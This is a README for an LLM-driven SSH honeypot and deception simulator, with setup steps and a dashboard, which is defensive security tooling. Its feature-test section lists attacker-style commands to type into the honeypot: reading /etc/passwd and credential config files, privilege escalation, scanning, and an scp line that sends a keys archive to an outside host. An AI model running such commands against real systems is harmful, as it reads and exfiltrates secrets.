# Project Chimera

A GenAI-centric SSH honeypot and deception simulator with:

- Multi-agent orchestration
- LLM-guided narrative generation  
- Adaptive prompt evolution
- OSI-aware labeling for events
- GAN discriminator with online learning
- React dashboard (no Streamlit)

## Setup

```bash
pip install -r requirements.txt
```

Set your OpenRouter API key in `config.py`:

```python
OPENAI_API_KEY = "sk-or-v1-your-key-here"
OPENAI_BASE_URL = "https://openrouter.ai/api/v1"
```

Generate a host key if missing:

```bash
ssh-keygen -t rsa -b 2048 -f host_key -N ""
```

## Run

Terminal 1 — honeypot:
```bash
python honeypot.py
```

Terminal 2 — dashboard:
```bash
python serve_dashboard.py
```

Terminal 3 — connect as attacker:
```bash
ssh admin@localhost -p 2222
```

Dashboard opens at http://localhost:8080

## Test every feature

```bash
# MITRE tagging
whoami && id && uname -a && cat /etc/passwd && sudo su

# Canary tokens (triggers red alert on dashboard)
cat /var/www/html/config.php
cat /opt/app/config.json

# Network / OSI classification
netstat -tuln && curl http://10.0.0.2 && nmap 10.0.0.1

# Persistence
crontab -l

# Exfil
scp /opt/backup/keys.tar.gz user@1.2.3.4:/tmp/
```

GAN + red team fire after 10 commands. Prompt evolution fires after 5.

## Run tests

```bash
python -m pytest tests/ -v
```

## Data export

```bash
python data_pipeline.py
```
